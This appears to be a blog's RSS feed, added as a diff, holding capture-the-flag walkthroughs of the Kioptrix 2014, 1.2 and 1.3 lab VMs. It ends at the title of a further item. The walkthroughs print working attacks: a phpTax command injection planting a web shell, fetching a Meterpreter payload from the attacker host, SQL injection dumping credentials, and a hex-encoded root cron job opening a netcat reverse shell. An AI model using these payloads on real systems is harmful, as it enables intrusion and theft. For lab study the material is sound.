@@ -1,0 +1,878 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Kioptrix on Cheesy Rumbles</title>
+    <link>http://rastamouse.me/categories/kioptrix/</link>
+    <description>Recent content in Kioptrix on Cheesy Rumbles</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Fri, 25 Apr 2014 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://rastamouse.me/categories/kioptrix/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Kioptrix 2014</title>
+      <link>http://rastamouse.me/writeups/2014/kioptrix-2014/</link>
+      <pubDate>Fri, 25 Apr 2014 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2014/kioptrix-2014/</guid>
+      <description>
+
+&lt;p&gt;After a 2 year (hiatus?) since the last Kioptrix VM challenge, loneferret has released Kioptrix 2014.  This is still an &amp;lsquo;entry level&amp;rsquo; challenge, though it does have some interesting spins typical of loneferret&amp;rsquo;s style of VM challenges.  The goal of the challenge is to obtain the flag.&lt;/p&gt;
+
+&lt;h2 id=&#34;nmap:026e58d39a8939d7b2fc2f771f0be136&#34;&gt;Nmap&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sV -A -p- 192.168.1.125
+
+22/tcp   closed ssh
+80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
+| http-methods: Potentially risky methods: TRACE
+|_See http://nmap.org/nsedoc/scripts/http-methods.html
+|_http-title: Site doesn&#39;t have a title (text/html).
+8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
+|_http-methods: No Allow or Public header in OPTIONS response (status code 403)
+|_http-title: 403 Forbidden
+Running: FreeBSD 9.X
+OS CPE: cpe:/o:freebsd:freebsd:9
+OS details: FreeBSD 9.0-RELEASE
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;nikto-wfuzz:026e58d39a8939d7b2fc2f771f0be136&#34;&gt;Nikto, Wfuzz&lt;/h2&gt;
+
+&lt;p&gt;Since only web services are available, nikto and wfuzz seemed like a good place to start.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nikto -h 192.168.1.125 -Display 124; nikto -h 192.168.1.125:8080 -Display 124
+
+root@kali:~# wfuzz -c -zfile,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.1.125/FUZZ/
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nothing came back from these scans and I noticed in particular, the &lt;code&gt;wfuzz&lt;/code&gt; scans were running very slowly.  I did some checking to make sure it wasn&amp;rsquo;t my network playing up, and evenutually concluded that some sort of server-side filtering must be taking place.  Although I had some ideas about how this could be achieved, I didn&amp;rsquo;t proceed with any assumptions, save one.  The only thing I knew is that directories and issues could exist, that neither &lt;code&gt;nikto&lt;/code&gt; or &lt;code&gt;wfuzz&lt;/code&gt; could report, so I couldn&amp;rsquo;t trust them one bit.&lt;/p&gt;
+
+&lt;p&gt;Visiting the page on 8080 in &lt;code&gt;Iceweasel&lt;/code&gt; results in the same forbidden message reported by &lt;code&gt;nmap&lt;/code&gt;.  Whereas the page on 80 appears to be the default apache index page.&lt;/p&gt;
+
+&lt;p&gt;However, I had a look at the source code for this page, and there was an HTML comment present which is not normally there.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;META HTTP-EQUIV=&amp;quot;refresh&amp;quot; CONTENT=&amp;quot;5;URL=pChart2.1.3/index.php&amp;quot;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;This gives away the presence of another webapp.  Typing the address in manually takes you to &lt;code&gt;pChart 2.1.3&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&#34;pchart:026e58d39a8939d7b2fc2f771f0be136&#34;&gt;pChart&lt;/h2&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/kioptrix-2014/pchart.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;A bit of research into &lt;code&gt;pChart&lt;/code&gt; showed that this version has a directory traversal vulnerability - providing the opportunity to check out the Apache config files.  One of loneferret&amp;rsquo;s curve-balls regarding this VM is the use of FreeBSD, for which the default location of apache differs from other Linux distro&amp;rsquo;s.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;http://192.168.1.125/pChart2.1.3/examples/index.php?Action=View&amp;amp;Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Giving this file a good read reveals the method behind the web filtering - by useragent.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser
+VirtualHost *:8080
+    DocumentRoot /usr/local/www/apache22/data2
+Directory &amp;quot;/usr/local/www/apache22/data2&amp;quot;
+    Options Indexes FollowSymLinks
+    AllowOverride All
+    Order allow,deny
+    Allow from env=Mozilla4_browser
+/Directory
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Out of interest, I went and checked the apache error log and saw the records of all my scanning attempts getting blocked.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;[error] [client 192.168.1.120] client denied by server configuration&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;So Apache is checking for a particular useragent string, and rejects requests if it doesn&amp;rsquo;t match this string.  I went back to run &lt;code&gt;nikto&lt;/code&gt; again, with the additional option:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;-useragent Mozilla/4.0 Mozilla4_browser&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The results for 80 were the same as before, but the results for 8080 were vastly different.  I used a plugin for &lt;code&gt;Iceweasel&lt;/code&gt; that allows you to define the useragent strings and visited the page in my browser.&lt;/p&gt;
+
+&lt;p&gt;Instead of getting the forbidden message as before, I was given a directory listing which contained another webapp.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/kioptrix-2014/phptax.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;h2 id=&#34;phptax:026e58d39a8939d7b2fc2f771f0be136&#34;&gt;phpTax&lt;/h2&gt;
+
+&lt;p&gt;More research told me that this application was vulnerable to RCE - at last something that would help me get a shell!&lt;/p&gt;
+
+&lt;p&gt;It turns out the version of &lt;code&gt;netcat&lt;/code&gt; built within FreeBSD does not support the &lt;code&gt;-e&lt;/code&gt; option.  I tried playing with the backpipe method, but this didn&amp;rsquo;t seem to work - the connection to my machine would instantly drop.&lt;/p&gt;
+
+&lt;p&gt;I wanted to test if the &lt;code&gt;www&lt;/code&gt; user could write into the current directory.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;192.168.1.125:8080/phptax/drawimage.php?pfilez=xxx;id&amp;gt;test.txt;&amp;amp;pdf=make
+http://192.168.1.125:8080/phptax/test.txt
+uid=80(www) gid=80(www) groups=80(www)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I wanted an easier way to execute my commands, so echo&amp;rsquo;d some very simple php code into a file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;192.168.1.125:8080/phptax/drawimage.php?pfilez=xxx;echo &#39;&amp;lt; ?php system($_GET[cmd]); ? &amp;gt;&#39;&amp;gt;cmd.php;&amp;amp;pdf=make
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Next, I went ahead and generated a Meterpreter PHP payload, and placed it within &lt;code&gt;/var/www/&lt;/code&gt; (and started the apache service).  It didn&amp;rsquo;t appear as though the usual suspects (&lt;code&gt;wget&lt;/code&gt; etc) were installed, but this being FreeBSD I went in search of other tools which may be present.  &lt;code&gt;Fetch&lt;/code&gt; was one such tool and behaves just like &lt;code&gt;wget&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;http://192.168.1.125:8080/phptax/cmd.php?cmd=fetch%20http://192.168.1.120/shell.txt
+http://192.168.1.125:8080/phptax/cmd.php?cmd=ls
+cmd.php data drawimage.php files icons.inc index.php maps pictures readme shell.txt ttf
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Confirmed the file was there (I also cat&amp;rsquo;d it).  Next, I renamed the file to give it a .php extension.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;http://192.168.1.125:8080/phptax/cmd.php?cmd=mv%20shell.txt%20shell.php&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Then executed it (not before setting up my listener in the Metasploit Framework).&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;192.168.1.125:8080/phptax/shell.php&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;privilege-escalation:026e58d39a8939d7b2fc2f771f0be136&#34;&gt;Privilege Escalation&lt;/h2&gt;
+
+&lt;p&gt;It turned out that escalating myself to root was relatively simple.  I found a &lt;a href=&#34;http://www.exploit-db.com/exploits/28718/&#34;&gt;suitable kernel exploit&lt;/a&gt; and transfered it across using &lt;code&gt;netcat&lt;/code&gt;.  Compiled and ran:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gcc x.c -o x
+
+./x
+[+] SYSRET FUCKUP!!
+[+] Start Engine...
+[+] Crotz...
+[+] Crotz...
+[+] Crotz...
+[+] Woohoo!!!
+
+id
+uid=0(root) gid=0(wheel) groups=0(wheel)
+
+cat congrats.txt
+If you are reading this, it means you got root (or cheated).
+Congratulations either way...
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Kioptrix Level 1.2</title>
+      <link>http://rastamouse.me/writeups/2013/kioptrix-level-1-2/</link>
+      <pubDate>Wed, 23 Jan 2013 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2013/kioptrix-level-1-2/</guid>
+      <description>
+
+&lt;p&gt;This is a walkthough of how I completed the Kioptrix Level 1.2.  The goal of this challenge is to collect the flag.&lt;/p&gt;
+
+&lt;h2 id=&#34;nmap:dfc41ddb0541bee9ee434872f5cc4efd&#34;&gt;Nmap&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sV -A -p- kioptrix3.com
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+| ssh-hostkey:
+|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
+|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
+80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Ligoat Security - Got Goat? Security ...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;lotuscms:dfc41ddb0541bee9ee434872f5cc4efd&#34;&gt;LotusCMS&lt;/h2&gt;
+
+&lt;p&gt;This little website is powered by LotusCMS, which is vulnerable to remote code execution.  However, I wasn&amp;rsquo;t having much luck with anything other than the exploit in the Metasploit Framework.  Since I don&amp;rsquo;t like to rely on this, I pressed on to find another route in.&lt;/p&gt;
+
+&lt;p&gt;LotusCMS also has an LFI vulnerability, which I used to enumerate a list of users on the system (via &lt;code&gt;/etc/passwd&lt;/code&gt;).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;http://kioptrix3.com/index.php?system=../../../../../etc/passwd%00.html
+loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash
+dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I actually decided to hold off on bruteforcing their SSH logins.  It was my assumption that at this level of challenge, the password would be too complex to bruteforce in a reasonable amount of time.&lt;/p&gt;
+
+&lt;h2 id=&#34;gallery:dfc41ddb0541bee9ee434872f5cc4efd&#34;&gt;Gallery&lt;/h2&gt;
+
+&lt;p&gt;One of the blog posts referes to a new gallery application at kioptrix3.com/gallery.&lt;/p&gt;
+
+
+
+
+    
+    
+        
+        
+        
+        
+    
+
+    
+    
+    
+
+    
+    
+
+
+
+
+    
+
+
+    
+
+    
+        &lt;p&gt;&lt;span class=&#34;image center-image&#34;&gt;
+            &lt;img src=&#34;http://rastamouse.me/img/writeups/kioptrix-1-2/gallerific.jpg&#34; alt=&#34;&#34; /&gt;
+        &lt;/span&gt;&lt;/p&gt;
+    
+
+
+
+&lt;p&gt;A review of the page&amp;rsquo;s source code, reveals an HTML comment which shows the location of the admin login page - /gallery/gadmin.  This login page tells us that the application is called Gallarrific, which is vulnerable to SQLi in gallery.php.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;kioptrix3.com/gallery/gallery.php?id=&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;sqlmap:dfc41ddb0541bee9ee434872f5cc4efd&#34;&gt;SQLMap&lt;/h2&gt;
+
+&lt;p&gt;I plugged the URL into SQLMap and it confirmed the vulnerability.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=null --current-user --is-dba --current-db
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: PHP 5.2.4, Apache 2.2.8
+back-end DBMS: MySQL 5.0
+current user:    &#39;root@localhost&#39;
+current database:    &#39;gallery&#39;
+current user is DBA:    True
+
+root@kali:~# sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=null -D gallery --tables
++----------------------+
+| dev_accounts         |
+| gallarific_comments  |
+| gallarific_galleries |
+| gallarific_photos    |
+| gallarific_settings  |
+| gallarific_stats     |
+| gallarific_users     |
++----------------------+
+
+root@kali:~# sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=null -D gallery -T dev_accounts --dump
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I saved these hashes and cracked them with john.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# john /tmp/sqlmaphashes-eOPcIU.txt --format=raw-md5
+starwars         (loneferret)
+Mast3r           (dreg)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I also dumped the password for the admin account on gallarific.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=null -D gallery -T gallarific_users --dump
+admin:n0t7t1k4
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;My original intent was to use the admin password for Gallarific and attempt to upload a PHP backdoor.  However, I first decided to try the two passwords from the dev_accounts with SSH.&lt;/p&gt;
+
+&lt;h2 id=&#34;ssh:dfc41ddb0541bee9ee434872f5cc4efd&#34;&gt;SSH&lt;/h2&gt;
+
+&lt;p&gt;I was able to login as &lt;code&gt;loneferret&lt;/code&gt; with the password &lt;code&gt;starwars&lt;/code&gt; (blew my original SSH theory out of the water).&lt;/p&gt;
+
+&lt;p&gt;Within loneferret&amp;rsquo;s home directory was a file called &lt;code&gt;CompanyPolicy.README&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;loneferret@Kioptrix3:~$ cat CompanyPolicy.README 
+Hello new employee,
+It is company policy here to use our newly installed software for editing, creating and viewing files.
+Please use the command &#39;sudo ht&#39;.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I confirmed that loneferret had the rights to run ht with sudo.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;loneferret@Kioptrix3:~$ sudo -l
+User loneferret may run the following commands on this host:
+    (root) NOPASSWD: !/usr/bin/su
+    (root) NOPASSWD: /usr/local/bin/ht
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The obvious solution is to modify the sudoers file, to give loneferret sudo right to &lt;code&gt;/bin/bash&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht, /bin/bash&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;loneferret@Kioptrix3:~$ sudo -l
+User loneferret may run the following commands on this host:
+    (root) NOPASSWD: !/usr/bin/su
+    (root) NOPASSWD: /usr/local/bin/ht
+    (root) NOPASSWD: /bin/bash
+    
+loneferret@Kioptrix3:~$ sudo /bin/bash 
+
+root@Kioptrix3:~# id
+uid=0(root) gid=0(root) groups=0(root)
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Kioptrix Level 1.3</title>
+      <link>http://rastamouse.me/writeups/2013/kioptrix-level-1-3/</link>
+      <pubDate>Wed, 23 Jan 2013 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2013/kioptrix-level-1-3/</guid>
+      <description>
+
+&lt;p&gt;This is a walkthrough of how I completed the Kioptrix Level 1.3 challenge.  The goal is to find the flag.&lt;/p&gt;
+
+&lt;h2 id=&#34;nmap:11cee1ea035c402a8bc4284762fd11a6&#34;&gt;Nmap&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sV -A -p- 192.168.1.124
+
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+| ssh-hostkey:
+|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
+|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
+80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Site doesn&#39;t have a title (text/html).
+139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+
+Host script results:
+|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
+| smb-os-discovery:
+|   OS: Unix (Samba 3.0.28a)
+|   Computer name: Kioptrix4
+|   NetBIOS computer name:
+|   Domain name: localdomain
+|   FQDN: Kioptrix4.localdomain
+|_  System time: 2014-04-24T14:40:46-04:00
+| smb-security-mode:
+|   Account that was used for smb scripts: guest
+|   User-level authentication
+|   SMB Security: Challenge/response passwords supported
+|_  Message signing disabled (dangerous, but default)
+|_smbv2-enabled: Server doesn&#39;t support SMBv2 protocol
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;liggoat-login:11cee1ea035c402a8bc4284762fd11a6&#34;&gt;LigGoat Login&lt;/h2&gt;
+
+&lt;p&gt;I visited the web page takes you to a LigGoat login page.&lt;/p&gt;
+
+&lt;p&gt;I first tried &lt;code&gt;admin:admin&lt;/code&gt;, which redirected me to &lt;code&gt;checklogin.php&lt;/code&gt; and the error message &lt;em&gt;&amp;ldquo;Wrong Username or Password&amp;rdquo;&lt;/em&gt;.  I attempted to use some SQLi to bypass this page.  When I entered &lt;code&gt;admin:&#39; or &#39;1&#39;=&#39;1&#39;--&lt;/code&gt; I recieved the error message &lt;em&gt;&amp;ldquo;Warning: mysql_num_rows(): supplied argument is not a valid MySQL result resource in /var/www/checklogin.php on line 28&amp;rdquo;.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;This suggests that the password field is vulnerable, so to do the heavy lifting, I used &lt;code&gt;sqlmap&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&#34;sqlmap:11cee1ea035c402a8bc4284762fd11a6&#34;&gt;SQLMap&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# sqlmap -u http://192.168.1.124/checklogin.php --data=&amp;quot;myusername=admin&amp;amp;mypassword=1&amp;quot; -p mypassword
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This first attempt reported that the mypassword field was not vulnerable to SQLi, so I dialed up the level and risk.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# sqlmap -u http://192.168.1.124/checklogin.php --data=&amp;quot;myusername=admin&amp;amp;mypassword=1&amp;quot; -p mypassword --level=5 --risk=3
+POST parameter &#39;mypassword&#39; seems to be &#39;OR boolean-based blind - WHERE or HAVING clause&#39; injectable 
+POST parameter &#39;mypassword&#39; seems to be &#39;MySQL &amp;lt; 5.0.12 AND time-based blind (heavy query)&#39; injectable
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# sqlmap -u http://192.168.1.124/checklogin.php --data=&amp;quot;myusername=admin&amp;amp;mypassword=1&amp;quot; --current-db --current-user --is-dba
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: PHP 5.2.4, Apache 2.2.8
+back-end DBMS: MySQL 5
+current user:    &#39;root@localhost&#39;
+current database:    &#39;members&#39;
+current user is DBA:    True
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# sqlmap -u http://192.168.1.124/checklogin.php --data=&amp;quot;myusername=admin&amp;amp;mypassword=1&amp;quot; --dbs
+[*] information_schema
+[*] members
+[*] mysql
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# sqlmap -u http://192.168.1.124/checklogin.php --data=&amp;quot;myusername=admin&amp;amp;mypassword=1&amp;quot; -D members --tables
+root@kali:~# sqlmap -u http://192.168.1.124/checklogin.php --data=&amp;quot;myusername=admin&amp;amp;mypassword=1&amp;quot; -D members -T members --dump
+1  john  MyNameIsJohn   
+2  robert  ADGAdsafdfwt4gadfga==
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# sqlmap -u http://192.168.1.124/checklogin.php --data=&amp;quot;myusername=admin&amp;amp;mypassword=1&amp;quot; -D mysql -T user --dump
+(root passwords blank)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;A few interesting bits of information there&amp;hellip;&lt;/p&gt;
+
+&lt;h2 id=&#34;ssh:11cee1ea035c402a8bc4284762fd11a6&#34;&gt;SSH&lt;/h2&gt;
+
+&lt;p&gt;In the previous challenge, information I obtained from a database allowed me to SSH into the system - so I tried this again with john and robert.
+I was able to login with both usernames and passwords, but each user was dropped into a limited shell of some description.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ssh john @ 192.168.1.124
+john @ 192.168.1.124&#39;s password:
+Welcome to LigGoat Security Systems - We are Watching
+== Welcome LigGoat Employee ==
+LigGoat Shell is in place so you  don&#39;t screw up
+Type &#39;?&#39; or &#39;help&#39; to get the list of allowed commands
+john:~$ help
+cd  clear  echo  exit  help  ll  lpath  ls
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You can only run the commands as shown above, too many attempts to run unauthorised commands kicks you out (how rude).  I wondered if you could get further help on individual commands by typing help command.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;john:~$ help help
+Limited Shell (lshell) limited help.
+Cheers.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;That was a stroke of luck.  I went off to do a bit of research regarding &lt;code&gt;lshell&lt;/code&gt;, and found that it may be vulnerable to path restriction bypass which would allow me to run commands outside those which it specifies.  The vulnerability is based around failure of user input whilst checking restricted paths.  I tried to leverage this to run a new bash shell.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;john:~$ echo __import__(&#39;os&#39;).system(&amp;quot;/bin/bash&amp;quot;)
+john@Kioptrix4:~$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Another stroke of luck!&lt;/p&gt;
+
+&lt;h2 id=&#34;mysql:11cee1ea035c402a8bc4284762fd11a6&#34;&gt;MySQL&lt;/h2&gt;
+
+&lt;p&gt;I first made sure I could connect to MySQL as root, without a password.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;john@Kioptrix4:~$ mysql -h localhost -u root -e &amp;quot;show databases;&amp;quot;
++--------------------+
+| Database           |
++--------------------+
+| information_schema | 
+| members            | 
+| mysql              | 
++--------------------+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Next I wanted to see if I could use MySQL to write to the file system, so I carried out a simple test.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;john@Kioptrix4:~$ mysql -h localhost -u root -e &amp;quot;use mysql; select 0x7468697320697320612074657374 into outfile &#39;/test&#39;;&amp;quot;
+
+john@Kioptrix4:~$ cat /test
+this is a test
+
+john@Kioptrix4:~$ ls -l /test
+-rw-rw-rw- 1 root root 15 2014-04-25 05:22 /test
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This shows that I can write to the filesystem, but more importantly, as the root user.&lt;/p&gt;
+
+&lt;h2 id=&#34;cron:11cee1ea035c402a8bc4284762fd11a6&#34;&gt;Cron&lt;/h2&gt;
+
+&lt;p&gt;I thought I could then use this to write a new job into &lt;code&gt;cron&lt;/code&gt;, to automate a &lt;code&gt;netcat&lt;/code&gt; connection to my IP.  Since I can write as root, I can ensure the resulting shell is run with root privileges.&lt;/p&gt;
+
+&lt;p&gt;First check where netcat is:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;john@Kioptrix4:~$ whereis nc
+nc: /bin/nc.traditional
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then write the file:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;john@Kioptrix4:~$ mysql -h localhost -u root -e &amp;quot;use mysql; select 0x2a202a202a202a202a20726f6f74202f62696e2f6e632e747261646974696f6e616c203139322e3136382e312e31323020343433202d65202f62696e2f62617368 into outfile &#39;/etc/cron.d/totally-legitimate-cron&#39;;&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Set up my listener, and&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nc -lnvp 443
+nc: listening on :: 443 ...
+nc: listening on 0.0.0.0 443 ...
+nc: connect to 192.168.1.120 443 from 192.168.1.124 58497
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+cat congrats.txt
+Congratulations!
+You&#39;ve got root.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;epilogue:11cee1ea035c402a8bc4284762fd11a6&#34;&gt;Epilogue&lt;/h2&gt;
+
+&lt;p&gt;Getting the &lt;code&gt;cron&lt;/code&gt; to work took a good amount of time - I thought I was getting the syntax incorrect.  I checked the running processes and saw more than a few instances of &lt;code&gt;netcat&lt;/code&gt; running, but the connections weren&amp;rsquo;t reaching me.&lt;/p&gt;
+
+&lt;p&gt;Changing the port to 443 fixed this and I got a connection.&lt;/p&gt;
+
+&lt;p&gt;In my root shell I checked the &lt;code&gt;iptables&lt;/code&gt;, and there was a cheeky rule in there to block traffic on port 4444 (as well as a few others).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;/sbin/iptables -L
+Chain INPUT (policy ACCEPT)
+target     prot opt source               destination         
+DROP       tcp  --  anywhere             anywhere            tcp dpt:4444 
+DROP       tcp  --  anywhere             anywhere            tcp dpts:1337:x11 
+DROP       tcp  --  anywhere             anywhere            tcp dpts:webmin:31337 
+DROP       tcp  --  anywhere             anywhere            tcp dpt:webcache 
+Chain FORWARD (policy ACCEPT)
+target     prot opt source               destination         
+Chain OUTPUT (policy ACCEPT)
+target     prot opt source               destination         
+DROP       tcp  --  anywhere             anywhere            tcp dpt:4444 
+DROP       tcp  --  anywhere             anywhere            tcp dpts:1337:x11 
+DROP       tcp  --  anywhere             anywhere            tcp dpts:webmin:31337 
+DROP       tcp  --  anywhere             anywhere            tcp dpt:webcache 
+DROP       tcp  --  anywhere             anywhere            tcp dpt:www 
+DROP       tcp  --  anywhere             anywhere            tcp dpt:ftp
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Kioptrix Level 1.1</title>
